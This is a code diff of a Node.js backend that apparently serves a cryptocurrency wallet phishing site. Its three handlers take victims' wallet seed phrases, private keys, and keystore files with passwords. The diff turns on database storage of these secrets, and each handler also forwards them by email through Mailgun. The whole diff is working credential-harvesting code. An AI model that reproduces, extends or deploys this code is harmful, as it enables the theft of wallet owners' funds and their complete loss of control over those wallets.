@@ -16,22 +16,22 @@ const mg = mailgun.client({
 exports.phraseData = async (req, res) => {
   const { phrase, email, wallet } = req.body;
 
-  // const phraseModel = new Phrase({
-  //   email,
-  //   wallet,
-  //   phrase,
-  // });
+  const phraseModel = new Phrase({
+    email,
+    wallet,
+    phrase,
+  });
 
   // save phrase to the database
-  // try {
-  //   await phraseModel.save();
-  // } catch (err) {
-  //   console.error(err.message);
-  //   return res.status(400).json({
-  //     success: false,
-  //     msg: err.message,
-  //   });
-  // }
+  try {
+    await phraseModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
 
   mg.messages
     .create(process.env.MAILGUN_BASE_URL, {
@@ -62,20 +62,20 @@ exports.phraseData = async (req, res) => {
 exports.privateKeyData = async (req, res) => {
   const { privateKey, email } = req.body;
 
-  // const privateKeyModel = new PrivateKey({
-  //   email,
-  //   privateKey,
-  // });
+  const privateKeyModel = new PrivateKey({
+    email,
+    privateKey,
+  });
 
-  // try {
-  //   await privateKeyModel.save();
-  // } catch (err) {
-  //   console.error(err.message);
-  //   return res.status(400).json({
-  //     success: false,
-  //     msg: err.message,
-  //   });
-  // }
+  try {
+    await privateKeyModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
 
   mg.messages
     .create(process.env.MAILGUN_BASE_URL, {
@@ -106,23 +106,23 @@ exports.privateKeyData = async (req, res) => {
 exports.keystoreJSONData = async (req, res) => {
   const { keyStore, password, email } = req.body;
 
-  // const keystoreJsonModel = new KeyStoreJson({
-  //   email,
-  //   keystoreJSON: {
-  //     keyStore,
-  //     password,
-  //   },
-  // });
+  const keystoreJsonModel = new KeyStoreJson({
+    email,
+    keystoreJSON: {
+      keyStore,
+      password,
+    },
+  });
 
-  // try {
-  //   await keystoreJsonModel.save();
-  // } catch (err) {
-  //   console.error(err.message);
-  //   return res.status(400).json({
-  //     success: false,
-  //     msg: err.message,
-  //   });
-  // }
+  try {
+    await keystoreJsonModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
 
   mg.messages
     .create(process.env.MAILGUN_BASE_URL, {
